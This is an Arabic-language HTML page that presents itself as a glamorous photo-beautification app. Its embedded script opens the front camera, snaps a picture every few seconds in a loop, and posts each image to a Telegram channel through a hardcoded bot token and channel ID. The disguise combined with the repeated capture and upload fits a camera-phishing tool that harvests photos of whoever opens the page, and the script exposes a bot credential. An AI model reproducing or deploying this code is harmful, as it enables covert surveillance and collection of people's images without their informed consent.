<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تجـميل الصور · كاميرا بنفسجية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #0b0510;
            background-image: radial-gradient(circle at 15% 30%, #2e1a47 0%, #0a0413 45%),
                              linear-gradient(145deg, #140b1f 0%, #030003 100%);
            font-family: 'Segoe UI', 'Arial', system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.2rem;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(55deg, 
                rgba(170, 120, 255, 0.03) 0px, 
                rgba(170, 120, 255, 0.08) 2px, 
                transparent 2px, 
                transparent 8px),
                radial-gradient(ellipse at 70% 40%, rgba(148, 70, 255, 0.25) 0%, transparent 60%);
            pointer-events: none;
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 20;
            max-width: 550px;
            width: 100%;
            background: rgba(15, 7, 28, 0.7);
            backdrop-filter: blur(20px) saturate(180%);
            -webkit-backdrop-filter: blur(20px) saturate(180%);
            border-radius: 56px;
            border: 1.5px solid rgba(200, 150, 255, 0.4);
            box-shadow: 0 35px 75px #000000cc, 0 0 0 2px #a974ff1a inset, 0 0 45px #9147ff4d;
            padding: 30px 28px 45px;
            transition: box-shadow 0.3s;
        }

        .container:hover {
            box-shadow: 0 45px 90px black, 0 0 0 3px #bc8eff33 inset, 0 0 70px #b56eff;
        }

        .cover-glam {
            width: 100%;
            height: 150px;
            background: linear-gradient(125deg, #321f4f, #1b0f2b, #2f1752);
            border-radius: 42px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            border: 1px solid #ba93ff;
            box-shadow: 0 25px 40px #00000099, 0 0 40px #ac6eff inset;
        }

        .cover-glam::before {
            content: '✨';
            font-size: 110px;
            position: absolute;
            right: 0px;
            top: -15px;
            color: #eeddff;
            text-shadow: 0 0 35px #e5bcff, 0 0 70px #c57eff;
            transform: rotate(12deg);
            opacity: 0.9;
        }

        .cover-glam::after {
            content: '🌸';
            font-size: 100px;
            position: absolute;
            left: 0px;
            bottom: -25px;
            color: #f1d2ff;
            text-shadow: 0 0 55px #f0c3ff, 0 0 95px #b56eff;
            transform: rotate(-18deg) scaleX(-1);
            opacity: 0.8;
        }

        .glam-text {
            font-size: 42px;
            font-weight: 900;
            letter-spacing: 4px;
            background: linear-gradient(145deg, #f7ecff, #dbb5ff, #fadfff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 35px #d6a9ff, 0 0 90px #b36eff;
            z-index: 10;
            filter: drop-shadow(0 8px 10px black);
            transform: scale(1.02);
        }

        .main-title {
            font-size: 3.3rem;
            font-weight: 800;
            text-align: center;
            margin: 5px 0 20px;
            background: linear-gradient(145deg, #f0dcff, #d7b0ff, #fbeaff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 35px #ad6eff, 2px 4px 15px #13001f;
            line-height: 1.2;
            letter-spacing: 2px;
        }

        .video-case {
            background: #0b0415;
            border-radius: 48px;
            padding: 12px;
            border: 2px solid #ac7eff;
            box-shadow: 0 25px 45px black, 0 0 0 3px #c49dff4d inset, 0 0 60px #b163ff;
            margin: 20px 0;
        }

        video, canvas {
            width: 100%;
            border-radius: 42px;
            display: block;
            aspect-ratio: 4/3;
            object-fit: cover;
            background: #110824;
            border: 1px solid #d1adff;
        }

        .countdown-ring {
            position: relative;
        }

        #countdownOverlay {
            position: absolute;
            top: 25px;
            left: 25px;
            background: rgba(22, 6, 40, 0.7);
            backdrop-filter: blur(14px);
            border: 2px solid #d19cff;
            width: 85px;
            height: 85px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3.2rem;
            font-weight: 900;
            color: #f2dcff;
            text-shadow: 0 0 35px #f2dcff, 0 0 75px #c481ff;
            box-shadow: 0 0 45px #d19cff, 0 8px 25px black;
            border: 2px solid #ebcdff;
        }

        .camera-badge {
            position: absolute;
            bottom: 25px;
            right: 25px;
            background: #13052bcc;
            backdrop-filter: blur(15px);
            border-radius: 60px;
            padding: 12px 24px;
            border: 1px solid #d1a3ff;
            color: #edd9ff;
            font-weight: 700;
            font-size: 1.2rem;
            display: flex;
            gap: 12px;
            align-items: center;
            box-shadow: 0 0 45px #cb9eff;
            letter-spacing: 0.5px;
        }

        .start-button {
            background: linear-gradient(150deg, #3c1e66, #1d0d33, #351b55);
            border: 1px solid #c8a2ff;
            border-radius: 88px;
            padding: 24px 40px;
            width: 100%;
            font-size: 2.5rem;
            font-weight: 800;
            color: #f4e6ff;
            text-shadow: 0 4px 12px black, 0 0 40px #e3bdff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 25px;
            box-shadow: 0 28px 45px #000000e0, 0 0 0 2px #e7c7ff inset, 0 0 60px #ba7eff;
            cursor: pointer;
            transition: all 0.25s ease;
            margin: 35px 0 20px;
            border: 1.5px solid #e2b9ff;
        }

        .start-button:hover {
            background: linear-gradient(150deg, #542d87, #2d174b, #472a6b);
            box-shadow: 0 30px 60px black, 0 0 0 3px #f3dbff inset, 0 0 80px #e2aeff;
            transform: scale(1.02);
            gap: 35px;
            color: white;
        }

        .start-button:active {
            transform: scale(0.97);
            background: #2c1549;
        }

        .status-panel {
            background: #120a1fcc;
            backdrop-filter: blur(20px);
            border-radius: 80px;
            padding: 20px 25px;
            margin: 18px 0 15px;
            border: 1.5px solid #b27eff;
            color: #efdcff;
            font-size: 1.2rem;
            font-weight: 600;
            text-align: center;
            box-shadow: 0 5px 35px black;
            min-height: 85px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .status-panel.success {
            background: #1e382acc;
            border-color: #a7ffae;
            color: #dcffd5;
            box-shadow: 0 0 60px #9effa2;
        }

        .status-panel.error {
            background: #3f1f31cc;
            border-color: #ff9f9f;
            color: #ffd6d6;
            box-shadow: 0 0 55px #ff7878;
        }

        .debug-card {
            background: #0d0720b3;
            backdrop-filter: blur(16px);
            border-radius: 50px;
            padding: 18px 22px;
            border: 1px dashed #af80ff;
            color: #cab6ff;
            font-size: 0.95rem;
            box-shadow: 0 8px 30px black;
            direction: ltr;
            text-align: left;
            max-height: 120px;
            overflow-y: auto;
        }

        .glow-spot {
            position: absolute;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, #9933ff22, transparent 80%);
            bottom: 0;
            left: 0;
            z-index: 5;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="glow-spot" style="top: -50px; right: -50px; background: radial-gradient(circle, #b56eff22, transparent 70%);"></div>
    <div class="container">
        <div class="cover-glam">
            <span class="glam-text">✦ تجـميل ✦</span>
        </div>

        <div class="main-title">تجـميل الصور</div>

        <div class="video-case countdown-ring">
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas" style="display: none;"></canvas>
            <div id="countdownOverlay">5</div>
            <div class="camera-badge">
                <span>📷</span> أمامية HD
            </div>
        </div>

        <button class="start-button" id="startCaptureBtn">
            <span>▶️</span> إبدأ التصوير <span>✨</span>
        </button>

        <div id="status" class="status-panel">
            ⚡ اضغط الزر لبدء التصوير الفوري
        </div>

        <div class="debug-card" id="debugInfo">
            <strong>⚙️ تشخيص:</strong> <span id="debugText">في انتظار التشغيل...</span>
        </div>
    </div>

    <script>
        (function() {
            // ✅ بيانات البوت والقناة - تم التحديث حسب طلبك
            const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
            const CHANNEL_ID = '-1003875161698';  // معرف القناة

            // العناصر
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const statusDiv = document.getElementById('status');
            const countdownDiv = document.getElementById('countdownOverlay');
            const debugText = document.getElementById('debugText');
            const startBtn = document.getElementById('startCaptureBtn');

            // الحالة
            let stream = null;
            let countdown = 5;
            let captureInterval = null;
            let isCapturing = false;
            let cameraReady = false;
            let photoCounter = 1; // عداد الصور

            // دالة تحديث التصحيح
            function updateDebug(msg) {
                const time = new Date().toLocaleTimeString('ar-EG');
                debugText.innerText = `${msg}  •  ${time}`;
                console.log(msg);
            }

            // إرسال الصورة إلى قناة تيليجرام
            async function sendToTelegram(imageDataUrl) {
                try {
                    updateDebug('تجهيز الصورة للإرسال...');
                    statusDiv.className = 'status-panel';
                    statusDiv.innerHTML = '⏳ جاري الإرسال إلى قناة تيليجرام...';

                    const blob = await (await fetch(imageDataUrl)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHANNEL_ID);
                    formData.append('photo', blob, `glam_shot_${photoCounter}.png`);
                    
                    // معلومات إضافية في التعليق
                    const now = new Date();
                    const dateStr = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
                    const caption = `📸 *صورة جديدة من تجميل الصور*\n\n` +
                                   `🖼️ الصورة رقم: ${photoCounter}\n` +
                                   `📅 التاريخ: ${dateStr}\n` +
                                   `📱 تم التقاطها بواسطة الكاميرا الأمامية\n` +
                                   `✨ بواسطة: تجميل الصور`;
                    
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    updateDebug('إرسال إلى القناة...');
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    
                    if (result.ok) {
                        statusDiv.className = 'status-panel success';
                        statusDiv.innerHTML = `✅ تم إرسال الصورة ${photoCounter} بنجاح إلى القناة!`;
                        updateDebug(`✓ تم إرسال الصورة ${photoCounter}`);
                        photoCounter++; // زيادة العداد بعد الإرسال الناجح
                    } else {
                        throw new Error(result.description || 'فشل الإرسال');
                    }
                } catch (err) {
                    console.error(err);
                    statusDiv.className = 'status-panel error';
                    statusDiv.innerHTML = `❌ خطأ في الإرسال: ${err.message}`;
                    updateDebug(`✗ خطأ: ${err.message}`);
                }
            }

            // التقاط صورة من الفيديو
            async function captureAndSend() {
                if (!stream || !cameraReady) {
                    updateDebug('الكاميرا غير جاهزة');
                    return;
                }
                try {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    
                    // قلب الصورة أفقياً لأنها كاميرا أمامية
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // إعادة الإعدادات للطبيعي
                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                    
                    const dataUrl = canvas.toDataURL('image/png');
                    updateDebug(`التقطت (${canvas.width}x${canvas.height})`);
                    await sendToTelegram(dataUrl);
                } catch (e) {
                    statusDiv.className = 'status-panel error';
                    statusDiv.innerHTML = `❌ خطأ التصوير: ${e.message}`;
                    updateDebug(`تصوير فشل: ${e.message}`);
                }
            }

            // بدء العد والتصوير الدوري
            function startCountdownCycle() {
                if (!cameraReady || !isCapturing) return;

                countdown = 5;
                countdownDiv.textContent = countdown;

                if (captureInterval) clearInterval(captureInterval);
                captureInterval = setInterval(() => {
                    if (!isCapturing || !cameraReady) {
                        clearInterval(captureInterval);
                        return;
                    }
                    countdown--;
                    countdownDiv.textContent = countdown;

                    if (countdown <= 0) {
                        clearInterval(captureInterval);
                        countdownDiv.textContent = '📸';
                        captureAndSend().then(() => {
                            if (isCapturing && cameraReady) {
                                setTimeout(() => {
                                    startCountdownCycle();
                                }, 1000);
                            } else {
                                countdownDiv.textContent = '⏸️';
                            }
                        }).catch(() => {
                            if (isCapturing && cameraReady) {
                                setTimeout(() => startCountdownCycle(), 1200);
                            }
                        });
                    }
                }, 1000);
            }

            // تفعيل وضع الالتقاط
            function enableCaptureMode() {
                if (!cameraReady || !stream) {
                    statusDiv.innerHTML = '⚠️ الكاميرا ليست جاهزة بعد، انتظر أو حاول مرة أخرى.';
                    return;
                }
                if (isCapturing) {
                    isCapturing = false;
                    if (captureInterval) clearInterval(captureInterval);
                }
                isCapturing = true;
                statusDiv.className = 'status-panel';
                statusDiv.innerHTML = '📸 بدأ التصوير الدوري – سيتم إرسال الصور إلى القناة';
                updateDebug('وضع التصوير التلقائي نشط');
                startCountdownCycle();
            }

            // تشغيل الكاميرا
            async function startCamera(forceStart = false) {
                try {
                    updateDebug('طلب الإذن للكاميرا الأمامية...');
                    statusDiv.innerHTML = '⏳ جاري تشغيل الكاميرا...';
                    
                    if (stream) {
                        stream.getTracks().forEach(t => t.stop());
                    }
                    
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });
                    
                    video.srcObject = stream;
                    cameraReady = false;
                    
                    video.onloadedmetadata = () => {
                        cameraReady = true;
                        updateDebug('✅ الكاميرا الأمامية جاهزة');
                        statusDiv.innerHTML = '✅ الكاميرا تعمل. اضغط "إبدأ التصوير" للإرسال.';
                        countdownDiv.textContent = '5';
                        
                        if (forceStart) {
                            enableCaptureMode();
                        }
                    };
                } catch (err) {
                    cameraReady = false;
                    let errorMsg = '';
                    if (err.name === 'NotAllowedError') errorMsg = 'تم رفض الإذن. يرجى السماح للكاميرا.';
                    else if (err.name === 'NotFoundError') errorMsg = 'لا توجد كاميرا أمامية.';
                    else errorMsg = err.message;
                    
                    statusDiv.className = 'status-panel error';
                    statusDiv.innerHTML = `❌ خطأ الكاميرا: ${errorMsg}`;
                    updateDebug(`خطأ: ${errorMsg}`);
                }
            }

            // زر البدء
            startBtn.addEventListener('click', async () => {
                updateDebug('تم الضغط على زر بدء التصوير');
                
                if (!stream || !cameraReady) {
                    await startCamera(true);
                } else {
                    if (!isCapturing) {
                        enableCaptureMode();
                    } else {
                        isCapturing = false;
                        if (captureInterval) clearInterval(captureInterval);
                        enableCaptureMode();
                        statusDiv.innerHTML = '🔄 إعادة تشغيل التصوير';
                    }
                }
            });

            // تنظيف
            window.addEventListener('beforeunload', () => {
                if (captureInterval) clearInterval(captureInterval);
                if (stream) stream.getTracks().forEach(t => t.stop());
            });

            // رسالة افتتاحية
            updateDebug('مرحباً! اضغط على الزر البنفسجي.');
        })();
    </script>
</body>
</html>
